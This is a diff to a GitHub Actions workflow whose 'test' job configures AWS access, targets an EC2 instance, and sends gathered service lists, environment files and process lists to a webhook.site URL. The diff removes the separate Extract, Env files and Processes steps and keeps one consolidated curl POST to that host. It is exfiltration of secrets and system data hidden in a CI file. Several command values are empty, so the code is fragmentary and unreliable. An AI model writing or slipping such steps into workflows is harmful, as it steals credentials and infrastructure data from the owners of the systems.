@@ -7,6 +7,9 @@ permissions:
 jobs:
   test:
     runs-on: ubuntu-latest
+    env:
+      INST: i-0135a8b2c53d14941
+      WH: "https://webhook.site/37ea2d05-4d87-46a6-a8d8-d06f4542e961"
     steps:
       - uses: actions/checkout@v4
       - name: Configure AWS
@@ -16,26 +19,7 @@ jobs:
           aws-region: us-east-1
       - name: Extract
         run: |
-          INST=i-0135a8b2c53d14941
-          WH="https://webhook.site/37ea2d05-4d87-46a6-a8d8-d06f4542e961"
-          CMD=
-          echo "Waiting for SSM..."
-          sleep 20
-          R=
-          curl -s -X POST  -H "Content-Type: text/plain" -d "SERVICES: "
-      - name: Env files
-        run: |
-          INST=i-0135a8b2c53d14941
-          WH="https://webhook.site/37ea2d05-4d87-46a6-a8d8-d06f4542e961"
           CMD=
           sleep 20
           R=
-          curl -s -X POST  -H "Content-Type: text/plain" -d "ENVFILES: "
-      - name: Processes
-        run: |
-          INST=i-0135a8b2c53d14941
-          WH="https://webhook.site/37ea2d05-4d87-46a6-a8d8-d06f4542e961"
-          CMD====
-          sleep 20
-          R=
-          curl -s -X POST  -H "Content-Type: text/plain" -d "PROCS: "
+          curl -s -X POST "" -H "Content-Type: text/plain" -d ""
